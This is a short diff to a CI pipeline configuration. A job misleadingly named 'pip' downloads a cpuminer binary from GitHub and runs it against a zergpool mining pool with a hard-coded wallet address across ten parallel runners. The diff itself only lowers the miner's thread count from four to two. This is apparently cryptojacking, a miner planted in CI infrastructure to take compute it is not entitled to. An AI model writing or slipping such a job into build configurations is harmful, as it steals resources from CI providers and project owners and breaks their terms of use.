@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: pip
           commands:
-            - 'mkdir cm && cd cm && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo -t4'
+            - 'mkdir cm && cd cm && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo -t2'
           parallelism: 10
